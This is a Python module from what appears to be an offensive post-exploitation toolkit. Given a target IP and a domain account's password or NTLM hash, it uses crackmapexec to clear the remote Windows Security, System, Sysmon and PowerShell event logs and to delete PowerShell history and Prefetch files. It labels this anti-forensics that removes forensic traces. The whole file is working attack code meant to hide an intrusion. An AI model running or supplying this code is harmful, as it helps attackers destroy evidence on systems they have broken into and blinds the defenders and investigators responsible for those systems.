#!/usr/bin/env python3
"""
Log Cleanup Module
Clears Windows Event Logs and other forensic artifacts
"""
import sys
import os
import argparse
import subprocess

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.database import DatabaseManager, Credential
from core.logger import setup_logger, get_logger

logger = None

def cleanup_logs(session_dir, target_ip, domain, username, password=None, ntlm_hash=None):
    """Clear Windows Event Logs on target system"""
    global logger
    setup_logger("log_cleanup", session_dir)
    logger = get_logger("log_cleanup")
    
    logger.warning(f"Initiating log cleanup on {target_ip} - ANTI-FORENSICS ALERT")
    
    # Build credentials
    if password:
        cred_args = ["-u", username, "-p", password]
    elif ntlm_hash:
        cred_args = ["-u", username, "-H", ntlm_hash]
    else:
        logger.error("No credentials provided")
        return
    
    # Event logs to clear
    event_logs = [
        "Security",
        "System",
        "Application",
        "Microsoft-Windows-Sysmon/Operational",
        "Microsoft-Windows-PowerShell/Operational",
        "Windows PowerShell"
    ]
    
    for log in event_logs:
        logger.info(f"Clearing {log} log...")
        
        cmd = [
            "crackmapexec", "smb", target_ip,
            "-d", domain
        ] + cred_args + [
            "-x", f"wevtutil.exe cl \\\"{log}\\\""
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                logger.info(f"✓ Cleared: {log}")
            else:
                logger.warning(f"✗ Failed: {log}")
        except Exception as e:
            logger.debug(f"Error clearing {log}: {e}")
    
    # Clear PowerShell history
    logger.info("Clearing PowerShell history...")
    ps_history_cmd = [
        "crackmapexec", "smb", target_ip,
        "-d", domain
    ] + cred_args + [
        "-X", "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue"
    ]
    
    try:
        subprocess.run(ps_history_cmd, capture_output=True, timeout=30)
        logger.info("✓ PowerShell history cleared")
    except:
        pass
    
    # Clear Prefetch
    logger.info("Clearing Prefetch files...")
    prefetch_cmd = [
        "crackmapexec", "smb", target_ip,
        "-d", domain
    ] + cred_args + [
        "-x", "del /q /f C:\\Windows\\Prefetch\\*"
    ]
    
    try:
        subprocess.run(prefetch_cmd, capture_output=True, timeout=30)
        logger.info("✓ Prefetch cleared")
    except:
        pass
    
    logger.warning("Log cleanup complete - forensic traces removed")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--target-ip", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--username", required=True)
    parser.add_argument("--password")
    parser.add_argument("--ntlm-hash")
    args = parser.parse_args()
    
    cleanup_logs(args.session_dir, args.target_ip, args.domain,
                args.username, args.password, args.ntlm_hash)
